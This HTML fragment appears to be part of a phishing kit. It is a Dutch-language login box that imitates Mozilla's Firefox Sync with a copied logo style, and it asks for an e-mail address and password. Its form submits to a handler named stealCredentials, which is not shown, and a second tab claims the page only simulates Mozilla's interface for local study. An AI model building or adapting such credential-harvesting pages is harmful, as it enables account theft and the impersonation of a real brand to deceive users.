<div class="login-box firefox" id="loginFormContainer">
    <div id="tab1-content" class="tab-content active">
        <div class="firefox-logo-icon" style="width: 32px; height: 32px; background: linear-gradient(135deg, #ff9400, #e66000, #95007c); border-radius: 50%; margin: 0 auto 15px auto; position: relative;">
            <div style="content: ''; position: absolute; width: 16px; height: 16px; background: #0060df; border-radius: 50%; top: 8px; left: 8px;"></div>
        </div>
        <h3>Firefox Sync</h3>
        <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Meld u aan om uw browsergegevens te synchroniseren</p>
        <form onsubmit="stealCredentials(event)">
            <input type="text" id="inputUser" placeholder="E-mailadres" required><br><br>
            <input type="password" id="inputPass" placeholder="Wachtwoord" required><br><br>
            <button type="submit" class="btn-fx" style="background-color: #ff9400;">Aanmelden</button>
        </form>
    </div>
    <div id="tab2-content" class="tab-content" style="display: none; text-align: left;">
        <h3>Mozilla Privacybeleid</h3>
        <p style="font-size: 13px; line-height: 1.6; color: #555;">
            Dit tabblad simuleert de officiële privacy-instructies van Mozilla Firefox om de werking van de interface lokaal te kunnen bestuderen.
        </p>
    </div>
</div>
